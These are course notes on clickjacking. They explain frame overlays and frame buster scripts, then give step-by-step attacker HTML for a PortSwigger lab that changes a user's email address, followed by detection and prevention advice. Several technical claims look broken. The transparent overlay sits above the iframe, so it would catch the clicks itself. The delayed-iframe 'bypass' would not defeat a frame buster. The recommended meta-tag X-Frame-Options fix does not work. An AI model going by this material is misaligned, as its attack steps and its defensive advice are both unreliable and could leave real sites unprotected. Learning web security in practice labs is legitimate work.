---
course: Web Security
topic: Clickjacking
tags: [web-security]
---

## Introduction to Clickjacking

Clickjacking, also known as UI redressing, is a malicious technique used by attackers to trick users into performing unintended actions on a website. This attack exploits the way browsers handle frames and overlays to manipulate user interactions. The attacker creates a seemingly benign webpage that contains hidden or transparent elements, which overlay the legitimate website. When a user interacts with these elements, they inadvertently perform actions on the underlying website.

### What is Clickjacking?

Clickjacking occurs when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another webpage. While the user thinks they are clicking on a button or link on the attacker’s page, they are actually clicking on a hidden element controlled by the attacker. This can result in the user unknowingly performing actions such as changing account settings, making purchases, or even logging out.

### Why Does Clickjacking Matter?

Clickjacking is significant because it can lead to serious security vulnerabilities. Users may be tricked into performing actions that compromise their personal data, financial information, or other sensitive details. For instance, an attacker might trick a user into changing their email address, which could then be used to reset passwords and gain unauthorized access to accounts.

### How Does Clickjacking Work Under the Hood?

To understand clickjacking, we need to delve into the mechanics of how browsers handle frames and overlays. Browsers allow websites to embed content from other sites using `<iframe>` tags. An `<iframe>` is an HTML element that allows you to embed another document within the current document. Attackers exploit this feature by embedding the target website within an iframe and overlaying it with transparent or opaque elements.

#### Example of a Basic Clickjacking Attack

Consider the following HTML code:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Example</title>
    <style>
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0; /* Transparent overlay */
        }
    </style>
</head>
<body>
    <div id="overlay">
        <button onclick="alert('Clicked!')">Click Me</button>
    </div>
    <iframe src="https://example.com/account-settings" style="width: 100%; height: 100%;"></iframe>
</body>
</html>
```

In this example, the attacker creates a webpage with a transparent overlay that contains a button labeled "Click Me". Below the overlay, an `<iframe>` tag embeds the target website's account settings page. When a user clicks on the "Click Me" button, they are actually clicking on the underlying iframe, potentially triggering actions on the target website.

### Real-World Examples of Clickjacking

Clickjacking attacks have been observed in various real-world scenarios. One notable example is the Facebook Likejacking incident in 2010. Attackers created a webpage that embedded the Facebook Like button within an iframe and overlaid it with a transparent image. When users clicked on the image, they were actually clicking on the Like button, which resulted in them liking the attacker's content without their knowledge.

Another example is the Google Docs clickjacking attack in 2017. Attackers exploited a vulnerability in Google Docs to create a webpage that embedded the Google Docs interface within an iframe. They then overlaid a transparent button that, when clicked, would trigger the sharing of a document with the attacker's account.

### Frame Buster Scripts

Frame buster scripts are designed to prevent clickjacking attacks by breaking out of frames. These scripts check if the current page is being displayed within an iframe and, if so, redirect the browser to the top-level window. This effectively prevents the page from being embedded within an iframe, thus thwarting clickjacking attempts.

#### Example of a Frame Buster Script

Here is an example of a simple frame buster script:

```javascript
if (top !== self) {
    top.location = self.location;
}
```

This script checks if the `top` window (the highest-level window in the frame hierarchy) is different from the `self` window (the current window). If they are different, it means the page is being displayed within an iframe, and the script redirects the `top` window to the current page's location, breaking out of the frame.

### Lab Setup: Clickjacking with a Frame Buster Script

In this lab, we will explore a scenario where a website is protected by a frame buster script. The goal is to bypass the frame buster and conduct a clickjacking attack that changes the user's email address.

#### Accessing the Lab

To access the lab, follow these steps:

1. Visit the URL: [PortSwigger Web Security Academy](https://portswigger.net/web-security)
2. Sign up for an account if you don't already have one.
3. Log in to your account.
4. Navigate to the Academy section.
5. Search for clickjacking labs.
6. Select lab number three titled "clickjacking with a frame buster script".

### Lab Objective

The objective of this lab is to craft HTML that frames the account page and tricks the user into changing their email address by clicking on a "ClickMe" button. The lab is considered solved when the email address is successfully changed.

### Crafting the Attack

To bypass the frame buster script and conduct the clickjacking attack, we need to carefully design our HTML and JavaScript. Here is a step-by-step guide to crafting the attack:

#### Step 1: Create the Attacker's Page

First, create the attacker's page that will contain the iframe and the overlay. The attacker's page should look like this:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Attack</title>
    <style>
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0; /* Transparent overlay */
        }
    </style>
</head>
<body>
    <div id="overlay">
        <button onclick="alert('Clicked!')">Click Me</button>
    </div>
    <iframe src="https://target-website.com/account-settings" style="width: 100%; height:  100%;"></iframe>
</body>
</html>
```

#### Step 2: Bypass the Frame Buster Script

The target website likely has a frame buster script that breaks out of the iframe. To bypass this, we need to delay the execution of the frame buster script until after the user has interacted with the overlay. We can achieve this by using JavaScript to dynamically load the iframe and delay the execution of the frame buster script.

Here is an updated version of the attacker's page that includes a delay mechanism:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Attack</title>
    <style>
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0; /* Transparent overlay */
        }
    </style>
</head>
<body>
    <div id="overlay">
        <button onclick="alert('Clicked!')">Click Me</button>
    </div>
    <div id="iframe-container"></div>

    <script>
        function loadIframe() {
            var iframe = document.createElement('iframe');
            iframe.src = 'https://target-website.com/account-settings';
            iframe.style.width = '100%';
            iframe.style.height = '100%';
            document.getElementById('iframe-container').appendChild(iframe);
        }

        setTimeout(loadIframe, 1000); // Delay loading the iframe by 1 second
    </script>
</body>
</html>
```

In this code, we use `setTimeout` to delay the loading of the iframe by 1 second. This gives the user enough time to interact with the overlay before the frame buster script is executed.

#### Step 3: Test the Attack

Once the attacker's page is set up, test the attack by navigating to the page and clicking on the "Click Me" button. If the attack is successful, the user's email address should be changed.

### Detection and Prevention

#### How to Detect Clickjacking Attacks

Detecting clickjacking attacks can be challenging, but there are several methods to identify potential vulnerabilities:

1. **Manual Testing**: Manually test the website for clickjacking vulnerabilities by attempting to embed the site within an iframe and checking if the frame buster script is effective.
2. **Automated Tools**: Use automated tools like Burp Suite, ZAP, or OWASP ZAP to scan the website for clickjacking vulnerabilities.
3. **Browser Extensions**: Use browser extensions like Clickjacking Tester to automatically test for clickjacking vulnerabilities.

#### How to Prevent Clickjacking Attacks

Preventing clickjacking attacks involves implementing robust security measures:

1. **X-Frame-Options Header**: Set the `X-Frame-Options` header to `DENY` or `SAMEORIGIN` to prevent the page from being embedded within an iframe.
2. **Content Security Policy (CSP)**: Implement a Content Security Policy (CSP) that restricts the sources from which content can be loaded.
3. **Frame Buster Scripts**: Use frame buster scripts to break out of frames and prevent clickjacking attacks.
4. **User Education**: Educate users about the risks of clickjacking and encourage them to be cautious when interacting with suspicious links or buttons.

#### Secure Coding Practices

Here is an example of a secure coding practice that prevents clickjacking attacks:

**Vulnerable Code:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Website</title>
</head>
<body>
    <!-- Vulnerable content -->
</body>
</html>
```

**Secure Code:**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Secure Website</title>
    <meta http-equiv="X-Frame-Options" content="SAMEORIGIN">
    <script>
        if (top !== self) {
            top.location = self.location;
        }
    </script>
</head>
<body>
    <!-- Secure content -->
</body>
</html>
```

In the secure code, we set the `X-Frame-Options` header to `SAMEORIGIN` and include a frame buster script to prevent the page from being embedded within an iframe.

### Conclusion

Clickjacking is a serious security threat that can lead to significant vulnerabilities if not properly addressed. By understanding the mechanics of clickjacking and implementing robust security measures, we can protect websites from these types of attacks. The lab exercise provides a practical example of how to bypass a frame buster script and conduct a clickjacking attack, as well as how to detect and prevent such attacks.

### Practice Labs

For hands-on experience with clickjacking and related web security topics, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs focused on web security, including clickjacking.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities for educational purposes.

These labs provide a safe environment to practice and learn about web security vulnerabilities and mitigation techniques.

---
<!-- nav -->
[[01-Clickjacking Overview|Clickjacking Overview]] | [[Web Security (PortSwigger)/05-Clickjacking/04-Lab 3 Clickjacking with a frame buster script/00-Overview|Overview]] | [[Web Security (PortSwigger)/05-Clickjacking/04-Lab 3 Clickjacking with a frame buster script/03-Practice Questions & Answers|Practice Questions & Answers]]
